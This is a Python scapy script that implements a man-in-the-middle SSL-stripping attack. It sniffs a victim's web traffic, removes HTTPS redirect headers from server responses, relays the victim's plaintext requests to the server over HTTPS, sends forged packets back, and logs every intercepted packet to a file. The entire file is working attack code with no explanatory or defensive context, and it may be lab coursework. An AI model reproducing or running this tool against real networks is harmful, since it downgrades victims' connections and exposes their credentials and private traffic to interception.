import scapy.all as sc
import http.client
from urllib.parse import urlparse

# Filter HTTPS redirect responses
def filter_response(pkt):
    return (
        pkt.haslayer(sc.Raw) and
        b"HTTP/1.1 30" in pkt[sc.Raw].load and
        b"Location: https://" in pkt[sc.Raw].load
    )

# Strip "Location: https://" header from redirect
def resp_ssl_strip(pkt, attackerMac, clientMac, attackerIP, clientIP, serverIP):
    print(f"Stripping HTTPS redirect: {pkt.summary()}")

    data = pkt[sc.Raw].load
    lines = data.split(b"\r\n")
    stripped_lines = [line for line in lines if not line.startswith(b"Location: https://")]
    new_load = b"\r\n".join(stripped_lines)

    ether = sc.Ether(src=attackerMac, dst=clientMac)
    ip = sc.IP(src=attackerIP, dst=clientIP)
    tcp = sc.TCP(
        sport=pkt[sc.TCP].sport,
        dport=pkt[sc.TCP].dport,
        seq=pkt[sc.TCP].seq,
        ack=pkt[sc.TCP].ack,
        flags=pkt[sc.TCP].flags
    )
    new_pkt = ether / ip / tcp / sc.Raw(load=new_load)

    del new_pkt[sc.IP].chksum
    del new_pkt[sc.TCP].chksum

    sc.sendp(new_pkt, iface=sc.conf.iface, verbose=False)

    # ACK to server to maintain TCP state
    ack_pkt = sc.IP(src=attackerIP, dst=serverIP) / sc.TCP(
        sport=pkt[sc.TCP].dport,
        dport=pkt[sc.TCP].sport,
        seq=pkt[sc.TCP].ack,
        ack=pkt[sc.TCP].seq + len(pkt[sc.Raw].load),
        flags="A"
    )
    sc.send(ack_pkt, verbose=False)

def terminate_tls_and_forward(pkt, attackerMac, clientMac, attackerIP, clientIP, serverIP):
    try:
        raw_data = pkt[sc.Raw].load

        # Extract request line
        request_line = raw_data.split(b"\r\n")[0]
        method, path, *_ = request_line.decode(errors="ignore").split()

        # Parse headers
        headers = {}
        header_section, _, body = raw_data.partition(b"\r\n\r\n")
        lines = header_section.split(b"\r\n")[1:]  # Skip request line
        for line in lines:
            if b": " in line:
                key, value = line.decode(errors="ignore").split(": ", 1)
                headers[key] = value

        host = headers.get("Host")
        if not host:
            print("[!] No Host header found.")
            return

        # Send HTTPS request to server
        conn = http.client.HTTPSConnection(host, timeout=5)
        body = body if body else None
        conn.request(method, path, body=body, headers=headers)
        response = conn.getresponse()
        response_body = response.read()

        # Build HTTP/1.1 response
        response_headers = [f"HTTP/1.1 {response.status} {response.reason}"]
        for hdr, val in response.getheaders():
            response_headers.append(f"{hdr}: {val}")
        response_headers.append("")  # End of headers
        http_response = "\r\n".join(response_headers).encode() + b"\r\n" + response_body

        # Send response to client with corrected SEQ/ACK
        seq = pkt[sc.TCP].ack
        ack = pkt[sc.TCP].seq + len(raw_data)

        ether = sc.Ether(src=attackerMac, dst=clientMac)
        ip = sc.IP(src=attackerIP, dst=clientIP)
        tcp = sc.TCP(
            sport=pkt[sc.TCP].sport,
            dport=pkt[sc.TCP].dport,
            seq=seq,
            ack=ack,
            flags='PA'
        )
        forged_pkt = ether / ip / tcp / sc.Raw(load=http_response)

        # Force recalculation of checksums
        del forged_pkt[sc.IP].chksum
        del forged_pkt[sc.TCP].chksum

        sc.sendp(forged_pkt, iface=sc.conf.iface, verbose=False)

    except Exception as e:
        print(f"[!] TLS Termination Error: {e}")

def is_rst(pkt):
    return sc.TCP in pkt and 'R' in pkt[sc.TCP].flags

def is_tcp_fin(pkt):
    return sc.TCP in pkt and 'F' in pkt[sc.TCP].flags

def forward_to_client(pkt, attackerMac, clientMac, attackerIP, clientIP):
    ether = sc.Ether(src=attackerMac, dst=clientMac)
    ip = sc.IP(src=attackerIP, dst=clientIP)
    tcp = sc.TCP(
        sport=pkt[sc.TCP].sport,
        dport=pkt[sc.TCP].dport,
        seq=pkt[sc.TCP].seq,
        ack=pkt[sc.TCP].ack,
        flags=pkt[sc.TCP].flags
    )
    payload = sc.Raw(load=pkt[sc.Raw].load) if pkt.haslayer(sc.Raw) else None
    new_pkt = ether / ip / tcp / payload if payload else ether / ip / tcp
    sc.sendp(new_pkt, iface=sc.conf.iface, verbose=False)
    log_packet("server -> client", pkt)

def forward_to_server(pkt, attackerMac, serverMac, attackerIP, serverIP):
    ether = sc.Ether(src=attackerMac, dst=serverMac)
    ip = sc.IP(src=attackerIP, dst=serverIP)
    tcp = sc.TCP(
        sport=pkt[sc.TCP].sport,
        dport=pkt[sc.TCP].dport,
        seq=pkt[sc.TCP].seq,
        ack=pkt[sc.TCP].ack,
        flags=pkt[sc.TCP].flags
    )
    payload = sc.Raw(load=pkt[sc.Raw].load) if pkt.haslayer(sc.Raw) else None
    new_pkt = ether / ip / tcp / payload if payload else ether / ip / tcp
    sc.sendp(new_pkt, iface=sc.conf.iface, verbose=False)
    log_packet("client -> server", pkt)

def forwarding(mode, clientIP, attackerIP, clientMac, serverIP, attackerMac, serverMac):
    while True:
        pkt = sc.sniff(
            filter="tcp port 80 or port 443",
            iface=sc.conf.iface,
            store=True,
            count=1,
            lfilter=lambda p: p.haslayer(sc.IP) and p.haslayer(sc.TCP) and (
                p[sc.IP].src == clientIP or p[sc.IP].src == serverIP
            )
        )[0]
        print("next is sniffed")
        log_packet("sniffed", pkt)

        if pkt[sc.IP].src == clientIP:
            if mode and pkt.haslayer(sc.Raw):
                terminate_tls_and_forward(pkt, attackerMac, clientMac, attackerIP, clientIP, serverIP)
            else:
                forward_to_server(pkt, attackerMac, serverMac, attackerIP, serverIP)

            if is_rst(pkt) or is_tcp_fin(pkt):
                return

        elif pkt[sc.IP].src == serverIP:
            if mode and filter_response(pkt):
                resp_ssl_strip(pkt, attackerMac, clientMac, attackerIP, clientIP, serverIP)
            else:
                forward_to_client(pkt, attackerMac, clientMac, attackerIP, clientIP)

            if is_rst(pkt) or is_tcp_fin(pkt):
                return

def log_packet(tag, pkt, filename="packet_log.txt"):
    with open(filename, "a") as f:
        f.write(f"=== {tag} Packet ===\n")
        f.write(pkt.summary() + "\n")
        f.write(str(pkt.show(dump=True)))
        f.write("\n===================\n\n")